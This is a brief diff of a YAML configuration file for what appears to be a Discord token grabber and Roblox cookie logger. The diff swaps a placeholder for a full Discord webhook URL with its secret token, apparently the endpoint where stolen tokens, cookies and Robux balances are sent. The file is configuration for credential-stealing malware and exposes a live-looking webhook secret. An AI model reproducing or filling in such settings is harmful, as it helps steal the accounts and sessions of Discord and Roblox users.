@@ -4,7 +4,7 @@
   grab discord token: true
 
 webhook_settings:
- webhook: "webhook here"
+ webhook: "https://discord.com/api/webhooks/1004476904314773615/ZJPxl3FVGlIazxr-1mWYlVjMWf4kepi8XCFeOu-YXSXV03DwGNKvgCE3HDWf5ITjBGED"
 
 roblox_ cookie_ logger_ settings:
   grab robux balance: true
